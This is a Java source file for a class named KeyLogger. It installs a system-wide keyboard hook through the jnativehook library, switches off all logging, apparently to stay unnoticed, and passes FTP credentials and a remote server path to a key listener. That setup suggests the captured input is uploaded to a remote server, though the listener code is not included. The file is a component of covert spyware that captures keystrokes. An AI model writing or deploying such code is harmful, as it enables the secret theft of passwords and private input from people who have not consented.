import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import java.util.logging.Handler;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 * Created by mihai on 16.06.2016.
 */
public class KeyLogger implements Runnable {

    private String localRootFolder;
    private String rootImagesPathOnServer;

    private FTPCredentials credentials;

    public KeyLogger(FTPCredentials credentials,
                     String localRootFolder,
                     String rootImagesPathOnServer)
    {
        this.localRootFolder = localRootFolder;
        this.rootImagesPathOnServer = rootImagesPathOnServer;

        this.credentials = credentials;
    }

    public void run()
    {

        Logger logger = Logger.getLogger(
                GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);

        // Change the level for all handlers attached to the default logger.
        Handler[] handlers = Logger.getLogger("").getHandlers();
        for (int i = 0; i < handlers.length; i++) {
            handlers[i].setLevel(Level.OFF);
        }

        try {
            GlobalScreen.registerNativeHook();
        }
        catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());

        }

        GlobalScreen.addNativeKeyListener(
                new GlobalKeyListener(credentials,
                        localRootFolder,
                rootImagesPathOnServer));

    }
}
